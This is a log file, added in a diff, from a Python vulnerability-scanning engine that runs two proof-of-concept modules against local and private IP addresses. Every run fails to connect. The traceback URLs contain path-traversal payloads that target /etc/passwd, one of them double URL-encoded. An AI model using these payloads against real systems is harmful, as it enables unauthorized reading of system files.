+[INFO] [2022-10-12 22:22:00,655] [PocManager.py] [run] [104] > result: []
+[INFO] [2022-10-12 22:22:00,656] [PocManager.py] [run] [106] > Finish task [75904866d9224365bb4a20af5a5f4e81](used 2s): targets['127.0.0.1'], vids['all']]
+[INFO] [2022-10-12 22:22:00,657] [PocManager.py] [run] [110] > ip数量：1 ； poc数量： 2
+[DEBUG] [2022-10-12 22:23:10,180] [GEngine.py] [main] [15] > Namespace(task_id='71e3df24c31e46f18248856b44214c5e', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:23:10,181] [GEngine.py] [main] [16] > Namespace(task_id='71e3df24c31e46f18248856b44214c5e', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[WARNING] [2022-10-12 22:23:10,182] [GEngine.py] [main] [17] > Namespace(task_id='71e3df24c31e46f18248856b44214c5e', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[ERROR] [2022-10-12 22:23:10,183] [GEngine.py] [main] [18] > Namespace(task_id='71e3df24c31e46f18248856b44214c5e', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[CRITICAL] [2022-10-12 22:23:10,183] [GEngine.py] [main] [19] > Namespace(task_id='71e3df24c31e46f18248856b44214c5e', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:23:10,184] [GEngine.py] [start] [23] > Namespace(task_id='71e3df24c31e46f18248856b44214c5e', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:23:10,187] [PocManager.py] [run] [73] > Get task [71e3df24c31e46f18248856b44214c5e]: targets['127.0.0.1'], poc_id['all']
+[INFO] [2022-10-12 22:23:10,188] [PocManager.py] [load_poc] [23] > ['all']
+[INFO] [2022-10-12 22:23:10,189] [PocManager.py] [load_poc] [28] > poc_name:['v_2022_0001_VSCC.py', 'v_2022_0002_CSXS.py']
+[INFO] [2022-10-12 22:23:10,190] [PocManager.py] [load_poc] [41] > pocs:{'v_2022_0001': 'v_2022_0001_VSCC.py', 'v_2022_0002': 'v_2022_0002_CSXS.py'}
+[INFO] [2022-10-12 22:23:10,194] [PocManager.py] [load_poc] [65] > poc_classes : defaultdict(<class 'list'>, {'v_2022_0001': ['pocs.v_2022_0001_VSCC', <class 'pocs.v_2022_0001_VSCC.VSCC'>], 'v_2022_0002': ['pocs.v_2022_0002_CSXS', <class 'pocs.v_2022_0002_CSXS.CSXS'>]})
+[INFO] [2022-10-12 22:23:10,195] [RunPoc.py] [start] [40] > 127.0.0.1 - v_2022_0001 start...
+[INFO] [2022-10-12 22:23:10,200] [RunPoc.py] [start] [40] > 127.0.0.1 - v_2022_0002 start...
+[ERROR] [2022-10-12 22:23:12,216] [v_2022_0002_CSXS.py] [verify] [62] > 127.0.0.1 - v_2022_0002 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x000001AD4B955B80>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AD4B955B80>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0002_CSXS.py", line 54, in verify
+    response = requests.get(url+payload, headers=headers, timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AD4B955B80>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[INFO] [2022-10-12 22:23:12,219] [RunPoc.py] [start] [42] > 127.0.0.1 - v_2022_0002 finish...
+[ERROR] [2022-10-12 22:23:12,224] [v_2022_0001_VSCC.py] [verify] [65] > 127.0.0.1 - v_2022_0001 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x000001AD4B955C70>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AD4B955C70>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0001_VSCC.py", line 54, in verify
+    response = requests.get(url + payload,headers=headers,timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001AD4B955C70>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[INFO] [2022-10-12 22:23:12,225] [RunPoc.py] [start] [42] > 127.0.0.1 - v_2022_0001 finish...
+[INFO] [2022-10-12 22:23:12,227] [PocManager.py] [run] [104] > result: []
+[INFO] [2022-10-12 22:23:12,228] [PocManager.py] [run] [106] > Finish task [71e3df24c31e46f18248856b44214c5e](used 2s): targets['127.0.0.1'], vids['all']]
+[INFO] [2022-10-12 22:23:12,228] [PocManager.py] [run] [110] > ip数量：1 ； poc数量： 2
+[DEBUG] [2022-10-12 22:25:46,137] [GEngine.py] [main] [15] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='d300dea00caf44f09cf8ebe283a46544', thread_num=10, time_out=60, vids=['all'])
+[INFO] [2022-10-12 22:25:46,137] [GEngine.py] [main] [16] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='d300dea00caf44f09cf8ebe283a46544', thread_num=10, time_out=60, vids=['all'])
+[WARNING] [2022-10-12 22:25:46,137] [GEngine.py] [main] [17] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='d300dea00caf44f09cf8ebe283a46544', thread_num=10, time_out=60, vids=['all'])
+[ERROR] [2022-10-12 22:25:46,138] [GEngine.py] [main] [18] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='d300dea00caf44f09cf8ebe283a46544', thread_num=10, time_out=60, vids=['all'])
+[CRITICAL] [2022-10-12 22:25:46,138] [GEngine.py] [main] [19] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='d300dea00caf44f09cf8ebe283a46544', thread_num=10, time_out=60, vids=['all'])
+[INFO] [2022-10-12 22:25:46,138] [GEngine.py] [start] [23] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='d300dea00caf44f09cf8ebe283a46544', thread_num=10, time_out=60, vids=['all'])
+[INFO] [2022-10-12 22:25:46,140] [PocManager.py] [run] [74] > Get task [d300dea00caf44f09cf8ebe283a46544]: targets['10.10.20.50'], poc_id['all']
+[INFO] [2022-10-12 22:25:46,140] [PocManager.py] [load_poc] [23] > ['all']
+[INFO] [2022-10-12 22:25:46,141] [PocManager.py] [load_poc] [28] > poc_name:['v_2022_0001_VSCC.py', 'v_2022_0002_CSXS.py']
+[INFO] [2022-10-12 22:25:46,141] [PocManager.py] [load_poc] [41] > pocs:{'v_2022_0001': 'v_2022_0001_VSCC.py', 'v_2022_0002': 'v_2022_0002_CSXS.py'}
+[INFO] [2022-10-12 22:25:46,143] [PocManager.py] [load_poc] [65] > poc_classes : defaultdict(<class 'list'>, {'v_2022_0001': ['pocs.v_2022_0001_VSCC', <class 'pocs.v_2022_0001_VSCC.VSCC'>], 'v_2022_0002': ['pocs.v_2022_0002_CSXS', <class 'pocs.v_2022_0002_CSXS.CSXS'>]})
+[INFO] [2022-10-12 22:25:46,144] [RunPoc.py] [start] [40] > 10.10.20.50 - v_2022_0001 start...
+[INFO] [2022-10-12 22:25:46,145] [RunPoc.py] [start] [40] > 10.10.20.50 - v_2022_0002 start...
+[ERROR] [2022-10-12 22:26:06,164] [v_2022_0002_CSXS.py] [verify] [62] > 10.10.20.50 - v_2022_0002 error: Traceback (most recent call last):
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 175, in _new_conn
+    (self._dns_host, self.port), self.timeout, **extra_kw
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\Python3.7.0_x64\lib\site-packages\gevent\_socketcommon.py", line 613, in connect
+    self._wait(self._write_event)
+  File "src\\gevent\\_hub_primitives.py", line 317, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 322, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 313, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 314, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 55, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_waiter.py", line 154, in gevent._gevent_c_waiter.Waiter.get
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 65, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_gevent_c_greenlet_primitives.pxd", line 35, in gevent._gevent_c_greenlet_primitives._greenlet_switch
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connectionpool.py", line 710, in urlopen
+    chunked=chunked,
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1229, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1275, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1224, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1016, in _send_output
+    self.send(msg)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 956, in send
+    self.connect()
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 182, in _new_conn
+    % (self.host, self.timeout),
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000002B0A40ED4A8>, 'Connection to 10.10.20.50 timed out. (connect timeout=20)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\adapters.py", line 499, in send
+    timeout=timeout,
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connectionpool.py", line 786, in urlopen
+    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='10.10.20.50', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000002B0A40ED4A8>, 'Connection to 10.10.20.50 timed out. (connect timeout=20)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyWork\GEngine\pocs\v_2022_0002_CSXS.py", line 54, in verify
+    response = requests.get(url+payload, headers=headers, timeout=req_time_out)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\sessions.py", line 587, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\sessions.py", line 701, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\adapters.py", line 553, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='10.10.20.50', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000002B0A40ED4A8>, 'Connection to 10.10.20.50 timed out. (connect timeout=20)'))
+
+[INFO] [2022-10-12 22:26:06,169] [RunPoc.py] [start] [42] > 10.10.20.50 - v_2022_0002 finish...
+[ERROR] [2022-10-12 22:26:06,171] [v_2022_0001_VSCC.py] [verify] [55] > 10.10.20.50 - v_2022_0001 error: Traceback (most recent call last):
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 175, in _new_conn
+    (self._dns_host, self.port), self.timeout, **extra_kw
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\Python3.7.0_x64\lib\site-packages\gevent\_socketcommon.py", line 613, in connect
+    self._wait(self._write_event)
+  File "src\\gevent\\_hub_primitives.py", line 317, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 322, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 313, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 314, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 55, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_waiter.py", line 154, in gevent._gevent_c_waiter.Waiter.get
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 65, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_gevent_c_greenlet_primitives.pxd", line 35, in gevent._gevent_c_greenlet_primitives._greenlet_switch
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connectionpool.py", line 710, in urlopen
+    chunked=chunked,
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1229, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1275, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1224, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 1016, in _send_output
+    self.send(msg)
+  File "D:\Python3.7.0_x64\lib\http\client.py", line 956, in send
+    self.connect()
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connection.py", line 182, in _new_conn
+    % (self.host, self.timeout),
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000002B0A40ED518>, 'Connection to 10.10.20.50 timed out. (connect timeout=20)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\adapters.py", line 499, in send
+    timeout=timeout,
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\connectionpool.py", line 786, in urlopen
+    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]
+  File "D:\Python3.7.0_x64\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='10.10.20.50', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000002B0A40ED518>, 'Connection to 10.10.20.50 timed out. (connect timeout=20)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyWork\GEngine\pocs\v_2022_0001_VSCC.py", line 44, in verify
+    response = requests.get(url + payload,headers=headers,timeout=req_time_out)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\sessions.py", line 587, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\sessions.py", line 701, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\Python3.7.0_x64\lib\site-packages\requests\adapters.py", line 553, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='10.10.20.50', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000002B0A40ED518>, 'Connection to 10.10.20.50 timed out. (connect timeout=20)'))
+
+[INFO] [2022-10-12 22:26:06,174] [RunPoc.py] [start] [42] > 10.10.20.50 - v_2022_0001 finish...
+[INFO] [2022-10-12 22:26:06,175] [PocManager.py] [run] [104] > result: []
+[INFO] [2022-10-12 22:26:06,175] [PocManager.py] [run] [107] > Finish task [d300dea00caf44f09cf8ebe283a46544](used 20s): targets['10.10.20.50'], vids['all']]
+[INFO] [2022-10-12 22:26:06,175] [PocManager.py] [run] [110] > ip数量：1 ； poc数量： 2
